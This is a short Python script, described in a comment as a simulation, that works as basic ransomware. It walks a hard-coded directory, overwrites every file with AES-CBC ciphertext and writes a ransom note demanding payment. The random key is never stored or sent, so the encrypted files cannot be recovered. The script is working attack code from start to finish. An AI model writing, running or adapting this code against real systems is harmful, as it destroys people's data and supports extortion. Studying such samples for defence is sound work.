import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import base64

# Generate AES key
def generate_key():
    return os.urandom(32)  # 256-bit key

# Encrypt the data
def encrypt_data(key, data):
    iv = os.urandom(16)  # 128-bit IV for AES
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    # Padding data to be multiple of block size (16 bytes)
    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(data) + padder.finalize()

    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    # Return IV and encrypted data
    return iv + encrypted_data

# Decrypt the data
def decrypt_data(key, encrypted_data):
    iv = encrypted_data[:16]
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()

    # Decrypt and unpad data
    decrypted_padded_data = decryptor.update(encrypted_data[16:]) + decryptor.finalize()
    unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
    decrypted_data = unpadder.update(decrypted_padded_data) + unpadder.finalize()

    return decrypted_data

# Encrypt files in the directory
def encrypt_files(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, 'rb') as f:
                file_data = f.read()
            
            encrypted_data = encrypt_data(key, file_data)
            
            # Overwrite the original file with encrypted data
            with open(file_path, 'wb') as f:
                f.write(encrypted_data)
                
            print(f"Encrypted: {file_path}")

# Decrypt files in the directory
def decrypt_files(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, 'rb') as f:
                encrypted_data = f.read()
            
            decrypted_data = decrypt_data(key, encrypted_data)
            
            # Overwrite the encrypted file with decrypted data
            with open(file_path, 'wb') as f:
                f.write(decrypted_data)
                
            print(f"Decrypted: {file_path}")

# Generate a ransom note
def create_ransom_note(directory):
    note = """Your files have been encrypted! To get them back, you need to pay a ransom.
    Failure to do so will result in the permanent loss of your files."""
    note_path = os.path.join(directory, 'RANSOM_NOTE.txt')
    with open(note_path, 'w') as f:
        f.write(note)
    print(f"Ransom note created at: {note_path}")

# Main function to run the simulation
def main():
    directory_to_encrypt = "F:/Confidential"
    key = generate_key()
    
    encrypt_files(directory_to_encrypt, key)
    create_ransom_note(directory_to_encrypt)


if __name__ == "__main__":
    main()
